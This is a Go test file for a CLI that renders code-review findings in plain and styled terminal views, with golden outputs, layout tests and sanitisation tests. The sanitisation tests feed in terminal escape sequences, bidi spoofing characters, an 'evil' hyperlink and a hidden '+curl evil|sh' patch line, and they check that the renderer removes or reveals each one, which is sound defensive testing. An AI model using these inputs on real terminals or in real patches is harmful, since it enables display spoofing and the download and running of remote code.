package cli

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"charm.land/lipgloss/v2"
	"github.com/entireio/cli/cmd/entire/cli/api"
	"github.com/entireio/cli/cmd/entire/cli/tuiutil"
)

// trailReviewRenderFixture returns findings covering every state the
// renderers branch on: each severity plus none, each status, stale freshness,
// ranged, single-line and whole-change locations, and a body long enough to
// truncate.
func trailReviewRenderFixture() (trailReviewTarget, []api.TrailReviewComment) {
	high := trailReviewSeverityHigh
	medium := trailReviewSeverityMedium
	low := trailReviewSeverityLow
	path := trailReviewTestFilePath
	start, end := 88, 92
	single := 12
	created := time.Date(2026, 10, 28, 12, 0, 0, 0, time.UTC)
	target := trailReviewTarget{Trail: api.TrailResource{
		ID:     "01M62HSGVJWDRV0Y3AB3HQRJ4G",
		Number: 42,
		Title:  "Add token refresh",
		Status: "open",
		Branch: "feat/token-refresh",
		Base:   "main",
	}}
	comments := []api.TrailReviewComment{
		{
			ID:        "01M63Q23WNMWAAAAAAAAAAAAAA",
			Body:      trailReviewStrPtr("Missing expiry skew handling"),
			Severity:  &medium,
			Status:    trailReviewStatusOpen,
			CreatedAt: created,
			Location:  api.TrailReviewLocation{Granularity: "line", FilePath: &path, StartLine: &start, EndLine: &end},
		},
		{
			ID:           "01M63Q22C0DZBBBBBBBBBBBBBB",
			Body:         trailReviewStrPtr("The retry loop never backs off, so a persistent 503 from the token endpoint spins the CPU at full speed until the context is cancelled."),
			Severity:     &high,
			Status:       trailReviewStatusOpen,
			StaleOutcome: trailReviewFreshnessStale,
			CreatedAt:    created,
			Location:     api.TrailReviewLocation{Granularity: "line", FilePath: &path, StartLine: &single},
		},
		{
			ID:        "01M63Q20JXB9CCCCCCCCCCCCCC",
			Body:      trailReviewStrPtr("Log line includes the refresh token"),
			Severity:  &low,
			Status:    trailReviewStatusResolved,
			CreatedAt: created,
			Location:  api.TrailReviewLocation{Granularity: "whole_change"},
		},
		{
			ID:       "01M63Q1YSXPGDDDDDDDDDDDDDD",
			Body:     trailReviewStrPtr("Rename for clarity"),
			Status:   trailReviewStatusDismissed,
			Location: api.TrailReviewLocation{Granularity: "whole_change"},
		},
	}
	return target, comments
}

// trailReviewDetailFixture is a finding with every optional detail field set.
// Its patch starts with a context line, whose leading space is part of the
// patch.
func trailReviewDetailFixture() api.TrailReviewComment {
	_, comments := trailReviewRenderFixture()
	comment := comments[0]
	confidence := 0.82
	comment.Confidence = &confidence
	comment.Title = trailReviewStrPtr("Expiry skew ignored")
	comment.Body = trailReviewStrPtr("Missing expiry skew handling.\n\nTokens that expire within the skew window are reused.")
	comment.SuggestedChanges = []api.TrailReviewSuggestedChange{{
		ID:               "sc_1",
		ChangeType:       "patch",
		ExpectedFilePath: trailReviewStrPtr(trailReviewTestFilePath),
		Patch:            trailReviewStrPtr(" const now = Date.now();\n-if (exp < now) {\n+if (exp - skew < now) {\n"),
		Instruction:      trailReviewStrPtr("Subtract the configured skew"),
	}}
	return comment
}

// The plain renderings are what agents and pipes read. These goldens pin them
// byte for byte so terminal styling can never change them by accident.

func TestPrintTrailReviewDashboard_PlainGolden(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	var out strings.Builder
	if err := printTrailReviewDashboard(&out, target, comments, "next-1", defaultTrailReviewListOptions(), countTrailReviewComments(comments), nil); err != nil {
		t.Fatal(err)
	}
	assertTrailReviewGolden(t, out.String(), trailReviewDashboardPlainGolden)
}

func TestPrintTrailReviewComments_PlainGolden(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	var out strings.Builder
	printTrailReviewComments(&out, comments, "next-1")
	assertTrailReviewGolden(t, out.String(), trailReviewListPlainGolden)
}

func TestPrintTrailReviewCommentDetail_PlainGolden(t *testing.T) {
	t.Parallel()
	var out strings.Builder
	printTrailReviewCommentDetail(&out, trailReviewDetailFixture())
	assertTrailReviewGolden(t, out.String(), trailReviewDetailPlainGolden)
}

func TestPrintTrailReviewCommentCreated_PlainGolden(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	var out strings.Builder
	printTrailReviewCommentCreated(&out, target, comments[1])
	assertTrailReviewGolden(t, out.String(), trailReviewCreatedPlainGolden)
}

// Server text can carry terminal control sequences; the plain views print it
// for NO_COLOR terminals too, so it must never reach the terminal raw.
func TestPrintTrailReview_PlainStripsTerminalEscapes(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	target.Trail.Title = "Title\x1b]0;pwned\x07"
	comments[0].Body = trailReviewStrPtr("Body \x1b[2Jcleared")
	path := "src/\x1b[31mred.ts"
	comments[0].Location = api.TrailReviewLocation{Granularity: "line", FilePath: &path}
	detail := trailReviewDetailFixture()
	detail.Title = trailReviewStrPtr("Title \x1b[1mbold")
	detail.Body = comments[0].Body
	detail.SuggestedChanges[0].Patch = trailReviewStrPtr("+\x1b]8;;https://evil\x07link")
	detail.SuggestedChanges[0].Instruction = trailReviewStrPtr("do \x1b[5mthis")

	var out strings.Builder
	if err := printTrailReviewDashboard(&out, target, comments, "", defaultTrailReviewListOptions(), countTrailReviewComments(comments), nil); err != nil {
		t.Fatal(err)
	}
	printTrailReviewComments(&out, comments, "")
	printTrailReviewCommentDetail(&out, detail)
	printTrailReviewCommentCreated(&out, target, comments[0])
	if strings.ContainsAny(out.String(), "\x1b\x07") {
		t.Fatalf("plain output passed through a terminal control sequence:\n%q", out.String())
	}
	for _, want := range []string{"Body cleared", "src/red.ts", "Title bold", "do this"} {
		if !strings.Contains(out.String(), want) {
			t.Fatalf("sanitized text %q missing:\n%s", want, out.String())
		}
	}
}

func assertTrailReviewGolden(t *testing.T, got, want string) {
	t.Helper()
	if got != want {
		t.Fatalf("plain output changed.\n--- got ---\n%s\n--- want ---\n%s", got, want)
	}
}

const trailReviewDashboardPlainGolden = `  Trail #42  Add token refresh
  Status: open · Branch: feat/token-refresh · Base: main
  ID: 01M62HSGVJWDRV0Y3AB3HQRJ4G

  Open findings: 2  high 1  medium 1  low 0  (1 stale)
  Resolved: 1        Dismissed: 1     Stale (all statuses): 1
  Showing up to 100 findings; next page: --cursor "next-1"

  ID            SEV     STATUS     FRESHNESS  LOCATION                   SUMMARY
  01M63Q23WNMW  Medium  open       current    src/auth/session.ts:88-92  Missing expiry skew handling
  01M63Q22C0DZ  High    open       stale      src/auth/session.ts:12     The retry loop never backs off, so a persistent 503 from the token endpoint spin…
  01M63Q20JXB9  Low     resolved   current    whole_change               Log line includes the refresh token
  01M63Q1YSXPG  -       dismissed  current    whole_change               Rename for clarity

Actions:
  entire trail finding show <finding-id>
  entire trail finding add -m "finding body" --file path --line 42
  entire trail finding update <finding-id> -m "updated body"
  entire trail finding apply <finding-id> --resolve
  entire trail finding resolve <finding-id> -m "fixed in <sha>"
  entire trail finding dismiss <finding-id> -m "not applicable"
  entire trail watch
`

const trailReviewListPlainGolden = `  ID            SEV     STATUS     FRESHNESS  LOCATION                   SUMMARY
  01M63Q23WNMW  Medium  open       current    src/auth/session.ts:88-92  Missing expiry skew handling
  01M63Q22C0DZ  High    open       stale      src/auth/session.ts:12     The retry loop never backs off, so a persistent 503 from the token endpoint spin…
  01M63Q20JXB9  Low     resolved   current    whole_change               Log line includes the refresh token
  01M63Q1YSXPG  -       dismissed  current    whole_change               Rename for clarity
More findings available; next page: --cursor "next-1"
`

const trailReviewDetailPlainGolden = `Finding:   01M63Q23WNMWAAAAAAAAAAAAAA
Title:     Expiry skew ignored
Status:    open
Freshness: current
Severity:  medium
Confidence: 0.82
Location: src/auth/session.ts:88-92

Missing expiry skew handling.

Tokens that expire within the skew window are reused.

Suggested changes:
- sc_1 (patch)
  file: src/auth/session.ts
  patch:
 const now = Date.now();
-if (exp < now) {
+if (exp - skew < now) {
  instruction: Subtract the configured skew
`

const trailReviewCreatedPlainGolden = `Created finding 01M63Q22C0DZBBBBBBBBBBBBBB on trail #42 (Add token refresh)
Status:   open
Severity: high
Location: src/auth/session.ts:12
`

// colorTrailReviewStyles enables the styled path with real palette styles, as
// a color terminal would get.
func colorTrailReviewStyles() trailReviewStyles {
	return newTrailReviewStyles(statusStylesFor(true, 80))
}

func renderStyledDashboard(t *testing.T, width int, comments []api.TrailReviewComment, nextCursor string, opts trailReviewListOptions, counts trailReviewCommentCounts) string {
	t.Helper()
	target, _ := trailReviewRenderFixture()
	var out strings.Builder
	if err := renderTrailReviewDashboardStyled(&out, colorTrailReviewStyles(), width, target, comments, nextCursor, opts, counts, nil); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), "\x1b[") {
		t.Fatalf("styled dashboard has no color codes:\n%s", out.String())
	}
	return tuiutil.StripANSI(out.String())
}

func anyStatusOptions() trailReviewListOptions {
	opts := defaultTrailReviewListOptions()
	opts.Status = trailReviewStatusAny
	return opts
}

func TestRenderTrailReviewDashboardStyled_GroupsBySeverityAndStatus(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	text := renderStyledDashboard(t, 100, comments, "", anyStatusOptions(), countTrailReviewComments(comments))
	for _, want := range []string{
		"● Trail #42  Add token refresh",
		"  open · feat/token-refresh → main · 01M62HSGVJWDRV0Y3AB3HQRJ4G",
		"  2 open (1 high · 1 medium · 0 low; 1 stale) · 1 resolved · 1 dismissed",
		"── Needs attention (2) ",
		"   High  open · stale  src/auth/session.ts:12  · 01M63Q22C0DZ",
		"   Medium  open  src/auth/session.ts:88-92  · 01M63Q23WNMW",
		"── Done (2) ",
		"  ✓ 01M63Q20JXB9  Log line includes the refresh token",
		"  – 01M63Q1YSXPG  dismissed · Rename for clarity",
		"entire trail finding show <id>",
		"entire trail finding --help for every action",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled dashboard missing %q:\n%s", want, text)
		}
	}
	// High sorts above Medium although the server returned Medium first.
	if strings.Index(text, "01M63Q22C0DZ") > strings.Index(text, "01M63Q23WNMW") {
		t.Fatalf("open findings not ordered most severe first:\n%s", text)
	}
}

func TestRenderTrailReviewDashboardStyled_WrapsSummaryToTwoLinesWithAge(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	const width = 60
	text := renderStyledDashboard(t, width, comments[1:2], "", defaultTrailReviewListOptions(), countTrailReviewComments(comments[1:2]))
	lines := strings.Split(text, "\n")
	first := -1
	for i, line := range lines {
		if strings.HasPrefix(line, " ◆ The retry loop") {
			first = i
		}
		if w := lipgloss.Width(line); w > width {
			t.Fatalf("line wider than %d: %q", width, line)
		}
	}
	if first < 0 {
		t.Fatalf("card summary missing:\n%s", text)
	}
	if !strings.HasSuffix(lines[first], " ago") {
		t.Fatalf("age not right-aligned on the first line: %q", lines[first])
	}
	if !strings.HasPrefix(lines[first+1], "   ") || !strings.HasSuffix(lines[first+1], "…") {
		t.Fatalf("second summary line should continue the summary and elide the rest: %q", lines[first+1])
	}
	if !strings.HasPrefix(lines[first+2], "   High  ") {
		t.Fatalf("metadata line should follow two summary lines: %q", lines[first+2])
	}
}

func TestRenderTrailReviewDashboardStyled_ZeroCreatedAtHasNoAge(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	comments[0].CreatedAt = time.Time{}
	text := renderStyledDashboard(t, 100, comments[:1], "", defaultTrailReviewListOptions(), countTrailReviewComments(comments[:1]))
	if strings.Contains(text, "ago") {
		t.Fatalf("zero CreatedAt rendered an age:\n%s", text)
	}
}

func TestRenderTrailReviewDashboardStyled_ListsStaleOpenFindings(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	// The default filter returned only the current open finding; the
	// summary counts know about the stale one too, so it gets its own section.
	text := renderStyledDashboard(t, 100, comments[:1], "", defaultTrailReviewListOptions(), countTrailReviewComments(comments))
	for _, want := range []string{
		"── Needs attention (1) ",
		"── Stale (1) ",
		"the code changed after these were raised",
		"The retry loop never backs off",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled dashboard missing %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "not shown by the current filters") {
		t.Fatalf("a listed stale finding is not hidden:\n%s", text)
	}
}

func TestRenderTrailReviewDashboardStyled_AnnouncesOpenFindingsHiddenByFilters(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	// --severity medium hides the stale high finding from both sections.
	opts := defaultTrailReviewListOptions()
	opts.Severity = trailReviewSeverityMedium
	text := renderStyledDashboard(t, 100, comments[:1], "", opts, countTrailReviewComments(comments))
	if want := "+1 open finding not shown by the current filters — drop --severity"; !strings.Contains(text, want) {
		t.Fatalf("styled dashboard missing %q:\n%s", want, text)
	}
	if strings.Contains(text, "── Stale") {
		t.Fatalf("stale section ignored --severity:\n%s", text)
	}
}

// Agents read the plain dashboard, so it lists stale open findings and names
// hidden ones the same way the styled view does.
func TestPrintTrailReviewDashboard_PlainListsStaleAndHiddenOpenFindings(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	counts := countTrailReviewComments(comments)
	render := func(rows []api.TrailReviewComment, opts trailReviewListOptions) string {
		var out strings.Builder
		if err := printTrailReviewDashboard(&out, target, rows, "", opts, counts, nil); err != nil {
			t.Fatal(err)
		}
		return out.String()
	}

	text := render(comments[:1], defaultTrailReviewListOptions())
	for _, want := range []string{
		"  Stale open findings (1): " + trailReviewStaleSectionNote,
		"01M63Q22C0DZ  High  open    stale",
		"Actions:",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("plain dashboard missing %q:\n%s", want, text)
		}
	}

	// No current rows: the stale section still shows, and the empty line says
	// only current findings are missing.
	text = render(nil, defaultTrailReviewListOptions())
	if !strings.Contains(text, "No current findings match the current filters.") || !strings.Contains(text, "Stale open findings (1)") {
		t.Fatalf("plain dashboard without current rows:\n%s", text)
	}

	opts := defaultTrailReviewListOptions()
	opts.Severity = trailReviewSeverityMedium
	text = render(comments[:1], opts)
	if want := "  +1 open finding not shown by the current filters — drop --severity"; !strings.Contains(text, want) {
		t.Fatalf("plain dashboard missing %q:\n%s", want, text)
	}

	// --freshness current still hides stale findings, and says so.
	opts = defaultTrailReviewListOptions()
	opts.Freshness = trailReviewFreshnessAny
	if text = render(comments[:2], opts); strings.Contains(text, "Stale open findings") || strings.Contains(text, "not shown") {
		t.Fatalf("--freshness any lists stale findings in the rows only:\n%s", text)
	}

	// A paged view cannot tell hidden findings from later pages.
	var out strings.Builder
	if err := printTrailReviewDashboard(&out, target, comments[:1], "next-1", defaultTrailReviewListOptions(), counts, nil); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out.String(), "Stale open findings") || strings.Contains(out.String(), "not shown") {
		t.Fatalf("paged dashboard should not add a stale section or hidden note:\n%s", out.String())
	}
}

// The totals line gives the trail-wide counts; a paged section counts only
// what it shows, since the open total ignores --severity and --freshness.
func TestRenderTrailReviewDashboardStyled_PagedCountsOnlyShownFindings(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	counts := countTrailReviewComments(comments)
	counts.Open = 37
	text := renderStyledDashboard(t, 100, comments[:2], "next-1", defaultTrailReviewListOptions(), counts)
	if strings.Contains(text, "of 37") {
		t.Fatalf("a paged section must not compare against the unfiltered open total:\n%s", text)
	}
	for _, want := range []string{
		"  37 open (",
		"── Needs attention (2 shown) ",
		`sorted within this page only. Next page: --cursor "next-1"`,
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled dashboard missing %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "not shown by the current filters") {
		t.Fatalf("a partial page must not claim findings are filtered out:\n%s", text)
	}
}

func TestRenderTrailReviewDashboardStyled_StatusFilterWithoutOpenHidesNeedsAttention(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	opts := defaultTrailReviewListOptions()
	opts.Status = trailReviewStatusResolved
	text := renderStyledDashboard(t, 100, comments[2:3], "", opts, countTrailReviewComments(comments))
	if strings.Contains(text, "Needs attention") || strings.Contains(text, "No open findings") {
		t.Fatalf("--status resolved should not render the open group:\n%s", text)
	}
	if !strings.Contains(text, "── Done (1) ") {
		t.Fatalf("resolved findings missing:\n%s", text)
	}
}

func TestRenderTrailReviewDashboardStyled_EmptyOpenGroup(t *testing.T) {
	t.Parallel()
	text := renderStyledDashboard(t, 100, nil, "", defaultTrailReviewListOptions(), trailReviewCommentCounts{})
	if !strings.Contains(text, "No open findings match the current filters.") {
		t.Fatalf("empty open group not explained:\n%s", text)
	}
}

func TestRenderTrailReviewCommentsStyled_UnknownStatusAndSeverityStillRender(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	odd := "critical"
	comments[0].Status = "triaged"
	comments[0].Severity = &odd
	var out strings.Builder
	renderTrailReviewCommentsStyled(&out, colorTrailReviewStyles(), 100, comments, "")
	text := tuiutil.StripANSI(out.String())
	for _, want := range []string{"── Other (1) ", "critical  triaged", "01M63Q23WNMW"} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled list missing %q:\n%s", want, text)
		}
	}
	for _, want := range []string{
		"── Done (2) ",
		"  ✓ 01M63Q20JXB9  Log line includes the refresh token\n",
		"  – 01M63Q1YSXPG  dismissed · Rename for clarity\n",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("resolved and dismissed findings belong under Done, resolved without a status prefix; missing %q:\n%s", want, text)
		}
	}
}

func TestRenderTrailReviewCommentsStyled_HasNoCountsLine(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	var out strings.Builder
	renderTrailReviewCommentsStyled(&out, colorTrailReviewStyles(), 100, comments[:2], "")
	if text := tuiutil.StripANSI(out.String()); strings.Contains(text, "resolved ·") || strings.Contains(text, "Done") {
		t.Fatalf("finding list has no complete counts and must not print totals:\n%s", text)
	}
}

func TestRenderTrailReviewCommentsStyled_Empty(t *testing.T) {
	t.Parallel()
	var out strings.Builder
	renderTrailReviewCommentsStyled(&out, colorTrailReviewStyles(), 100, nil, "")
	if got := tuiutil.StripANSI(out.String()); got != "  No findings found.\n" {
		t.Fatalf("empty styled list = %q", got)
	}
}

func TestRenderTrailReviewCommentDetailStyled(t *testing.T) {
	t.Parallel()
	var out strings.Builder
	renderTrailReviewCommentDetailStyled(&out, colorTrailReviewStyles(), 80, trailReviewDetailFixture())
	text := tuiutil.StripANSI(out.String())
	for _, want := range []string{
		"● Finding 01M63Q23WNMWAAAAAAAAAAAAAA",
		"  Medium · open · current · confidence 0.82",
		"  LOCATION  src/auth/session.ts:88-92",
		"  FINDING\n  Expiry skew ignored\n  Missing expiry skew handling.\n\n  Tokens that expire",
		"  SUGGESTED CHANGE  sc_1 · patch · src/auth/session.ts",
		"  Subtract the configured skew",
		// Flush-left and with the context line's leading space intact.
		"\n const now = Date.now();\n-if (exp < now) {\n+if (exp - skew < now) {\n",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled detail missing %q:\n%s", want, text)
		}
	}
}

func TestWrapTrailReviewText_KeepsStructure(t *testing.T) {
	t.Parallel()
	body := strings.Join([]string{
		"A prose line that is long enough to need wrapping at this narrow width.",
		"- a list item that also needs wrapping onto a second line",
		"    indented code that must stay exactly as written even if long",
		"\tTabbed code stays too",
		"| col | table |",
		"> a quote that is long and must not be rewrapped by the renderer",
		"Use internal/__init__.py with Map<T> unchanged.",
		"```",
		"fenced code that is long and must not be rewrapped by the renderer",
		"```",
		"~~~go",
		"unterminated fence runs to the end and is never wrapped either way",
	}, "\n")
	lines := wrapTrailReviewText(body, 30)
	got := strings.Join(lines, "\n")
	for _, want := range []string{
		"- a list item that also needs\n  wrapping onto a second line",
		"    indented code that must stay exactly as written even if long",
		"\tTabbed code stays too",
		"| col | table |",
		"> a quote that is long and must not be rewrapped by the renderer",
		"internal/__init__.py",
		"Map<T>",
		"fenced code that is long and must not be rewrapped by the renderer",
		"unterminated fence runs to the end and is never wrapped either way",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("wrapped text missing %q:\n%s", want, got)
		}
	}
	if !strings.HasPrefix(got, "A prose line that is long\nenough") {
		t.Fatalf("prose not wrapped at width:\n%s", got)
	}
}

func TestRenderTrailReviewStyled_StripsTerminalEscapes(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	target.Trail.Title = "Title\x1b]0;pwned\x07"
	comments[0].Body = trailReviewStrPtr("Body \x1b[2Jcleared")
	odd := "\x1b[5mblink"
	comments[0].Severity = &odd
	detail := trailReviewDetailFixture()
	detail.Body = comments[0].Body
	detail.SuggestedChanges[0].Patch = trailReviewStrPtr("+\x1b]8;;https://evil\x07link")

	var out strings.Builder
	s := colorTrailReviewStyles()
	if err := renderTrailReviewDashboardStyled(&out, s, 100, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
		t.Fatal(err)
	}
	renderTrailReviewCommentDetailStyled(&out, s, 100, detail)
	renderTrailReviewCommentCreatedStyled(&out, s, 100, target, comments[0])
	for _, bad := range []string{"\x1b]", "\x07", "\x1b[2J", "\x1b[5m"} {
		if strings.Contains(out.String(), bad) {
			t.Fatalf("styled output passed through %q", bad)
		}
	}
}

// A width-bound view measures display cells: CJK runes take two each, and
// long titles and unknown severities must not push a line past the layout.
func TestRenderTrailReviewStyled_FitsWidthInDisplayCells(t *testing.T) {
	t.Parallel()
	const width = 60
	target, comments := trailReviewRenderFixture()
	target.Trail.Title = strings.Repeat("刷新令牌", 20)
	odd := strings.Repeat("unclassified", 10)
	comments[0].Severity = &odd
	comments[1].Body = trailReviewStrPtr(strings.Repeat("重试循环从不退避。", 20))
	detail := trailReviewDetailFixture()
	detail.Title = trailReviewStrPtr(strings.Repeat("过期偏差被忽略", 20))
	detail.Severity = &odd

	var out strings.Builder
	s := colorTrailReviewStyles()
	if err := renderTrailReviewDashboardStyled(&out, s, width, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
		t.Fatal(err)
	}
	renderTrailReviewCommentsStyled(&out, s, width, comments, "")
	renderTrailReviewCommentDetailStyled(&out, s, width, detail)
	renderTrailReviewCommentCreatedStyled(&out, s, width, target, comments[0])
	text := tuiutil.StripANSI(out.String())
	for line := range strings.SplitSeq(text, "\n") {
		if w := lipgloss.Width(line); w > width {
			t.Fatalf("line is %d cells, wider than %d: %q\n%s", w, width, line, text)
		}
	}
	for _, want := range []string{"● Trail #42  刷新令牌", "  过期偏差被忽略", "unclassified"} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled output missing %q:\n%s", want, text)
		}
	}
}

func TestTrailReviewFirstParagraph_SkipsLeadingLocationParagraph(t *testing.T) {
	t.Parallel()
	for body, want := range map[string]string{
		"Location: `a.go:1` (at abc)\n\nThe real problem.\n\nDetails.": "The real problem.",
		"Location: `a.go:1` (at abc)":                                  "Location: `a.go:1` (at abc)",
		"First line\nsecond line\n\nMore.":                             "First line second line",
	} {
		if got := trailReviewFirstParagraph(api.TrailReviewComment{Body: trailReviewStrPtr(body)}); got != want {
			t.Errorf("trailReviewFirstParagraph(%q) = %q, want %q", body, got, want)
		}
	}
}

// The change's project agents (main #2969) show in the styled dashboard too.
func TestRenderTrailReviewDashboardStyled_ShowsProjectAgents(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	agents := json.RawMessage(`[{"agent":{"id":"01M5TA124RRH3JVWJP0B75G16Z","name":"Slop","preset":{"id":"slop","version":3}},` +
		`"signal":{"value_type":"size","polarity":"lower_is_better"},"reading":{"size_value":"small"},` +
		`"latest_run":{"id":"01M66YSQN8151AHGC5WCEQTTMP","status":"succeeded","head_sha":"71e662cdc07ed6c2a30f98b20ad1b7726334ba83"}}]`)
	var out strings.Builder
	if err := renderTrailReviewDashboardStyled(&out, colorTrailReviewStyles(), 100, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), agents); err != nil {
		t.Fatal(err)
	}
	text := tuiutil.StripANSI(out.String())
	for _, want := range []string{"Agents:", "Slop", "small", "succeeded", "── Needs attention (2) "} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled dashboard missing %q:\n%s", want, text)
		}
	}
	if strings.Index(text, "Agents:") > strings.Index(text, "Needs attention") {
		t.Fatalf("agents should follow the totals, before the findings:\n%s", text)
	}
}

// A printed patch must still apply: carriage returns and non-ASCII spaces
// stay, while escapes and bidi controls that could drive or spoof the
// terminal go.
func TestTrailReviewPatchTextKeepsPatchBytes(t *testing.T) {
	t.Parallel()
	patch := "\n-a\u00a0b\r\n+a\u3000b\x1b[2J\u202e\r\n\n"
	got, altered := trailReviewPatchText(&patch)
	if want := "-a\u00a0b\r\n+a\u3000b"; got != want || !altered {
		t.Fatalf("trailReviewPatchText = %q, %v; want %q, true", got, altered, want)
	}
}

// A lone carriage return could hide one line's text behind another's on a
// terminal while the hidden bytes are what gets applied; it shows as ^M.
func TestTrailReviewPatchTextShowsLoneCarriageReturn(t *testing.T) {
	t.Parallel()
	patch := "+curl evil|sh\r+// harmless\r\n"
	got, altered := trailReviewPatchText(&patch)
	if want := "+curl evil|sh^M+// harmless"; got != want || !altered {
		t.Fatalf("trailReviewPatchText = %q, %v; want %q, true", got, altered, want)
	}
}

// The last page reached with --cursor has no next cursor but is still a
// partial view, so it must not blame the filters for the other pages.
func TestRenderTrailReviewDashboardStyled_LastPageIsStillPaged(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	counts := countTrailReviewComments(comments)
	counts.Open = 37
	opts := defaultTrailReviewListOptions()
	opts.Cursor = "page-3"
	text := renderStyledDashboard(t, 100, comments[:2], "", opts, counts)
	if !strings.Contains(text, "── Needs attention (2 shown) ") {
		t.Fatalf("last page should say it is partial:\n%s", text)
	}
	if strings.Contains(text, "not shown by the current filters") {
		t.Fatalf("a later page must not claim findings are filtered out:\n%s", text)
	}
}

// With --cursor and no explicit --status, the server keeps the cursor's
// original filters while opts.Status is only the local default, so the
// dashboard renders what the page returned without assuming a status filter.
func TestRenderTrailReviewDashboardStyled_CursorWithoutStatusRendersReturnedFindings(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	opts := defaultTrailReviewListOptions()
	opts.Cursor = "page-2"
	counts := countTrailReviewComments(comments)

	text := renderStyledDashboard(t, 100, comments[2:], "", opts, counts)
	for _, bad := range []string{"Needs attention", "No open findings match", "not shown by the current filters"} {
		if strings.Contains(text, bad) {
			t.Fatalf("a page of done findings must not render %q:\n%s", bad, text)
		}
	}
	if !strings.Contains(text, "── Done (2) ") {
		t.Fatalf("returned findings missing:\n%s", text)
	}

	text = renderStyledDashboard(t, 100, nil, "", opts, counts)
	if !strings.Contains(text, "  No findings found.\n") || strings.Contains(text, "No open findings match") {
		t.Fatalf("an empty cursor page should say only that nothing came back:\n%s", text)
	}
}

// An explicit --status reaches the server with the cursor, so the open
// section is still known to be filtered.
func TestRenderTrailReviewDashboardStyled_CursorWithExplicitStatusKeepsOpenSection(t *testing.T) {
	t.Parallel()
	opts := defaultTrailReviewListOptions()
	opts.Cursor = "page-2"
	opts.StatusChanged = true
	text := renderStyledDashboard(t, 100, nil, "", opts, trailReviewCommentCounts{Open: 3})
	for _, want := range []string{"── Needs attention (0 shown) ", "No open findings match the current filters."} {
		if !strings.Contains(text, want) {
			t.Fatalf("styled dashboard missing %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "not shown by the current filters") {
		t.Fatalf("a paged view must not blame the filters:\n%s", text)
	}
}

// Bidi controls are format runes, not control runes, so the display
// sanitizer keeps them; they could visually reorder a line in either view.
func TestRenderTrailReview_StripsBidiControls(t *testing.T) {
	t.Parallel()
	target, comments := trailReviewRenderFixture()
	target.Trail.Title = "Add \u202etoken refresh"
	path := "src/\u202ests.noisses/auth.ts"
	comments[0].Location = api.TrailReviewLocation{Granularity: "line", FilePath: &path}
	detail := trailReviewDetailFixture()
	detail.Location = comments[0].Location
	detail.Title = trailReviewStrPtr("Expiry \u2066skew\u2069 ignored")

	var plain strings.Builder
	if err := printTrailReviewDashboard(&plain, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
		t.Fatal(err)
	}
	printTrailReviewComments(&plain, comments, "")
	printTrailReviewCommentDetail(&plain, detail)
	printTrailReviewCommentCreated(&plain, target, comments[0])

	var styled strings.Builder
	s := colorTrailReviewStyles()
	if err := renderTrailReviewDashboardStyled(&styled, s, 100, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
		t.Fatal(err)
	}
	renderTrailReviewCommentsStyled(&styled, s, 100, comments, "")
	renderTrailReviewCommentDetailStyled(&styled, s, 100, detail)
	renderTrailReviewCommentCreatedStyled(&styled, s, 100, target, comments[0])

	for name, out := range map[string]string{"plain": plain.String(), "styled": tuiutil.StripANSI(styled.String())} {
		if strings.ContainsAny(out, "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069") {
			t.Fatalf("%s output kept a bidi control:\n%q", name, out)
		}
		for _, want := range []string{"Add token refresh", "src/sts.noisses/auth.ts", "Expiry skew ignored"} {
			if !strings.Contains(out, want) {
				t.Fatalf("%s output missing %q:\n%s", name, want, out)
			}
		}
	}
}

// A patch that display sanitizing changed is not the exact patch; both views
// say so and point at the exact bytes, and only then.
func TestRenderTrailReview_NotesAlteredPatch(t *testing.T) {
	t.Parallel()
	const note = "this patch has characters not shown here"
	render := func(detail api.TrailReviewComment) (string, string) {
		var plain, styled strings.Builder
		printTrailReviewCommentDetail(&plain, detail)
		renderTrailReviewCommentDetailStyled(&styled, colorTrailReviewStyles(), 120, detail)
		return plain.String(), tuiutil.StripANSI(styled.String())
	}

	plain, styled := render(trailReviewDetailFixture())
	if strings.Contains(plain, note) || strings.Contains(styled, note) {
		t.Fatalf("an intact patch must not carry the note:\nplain:\n%s\nstyled:\n%s", plain, styled)
	}

	for _, patch := range []string{"+a\u202eb\n", "+a\x1b[31mb\n", "+a\rb\n"} {
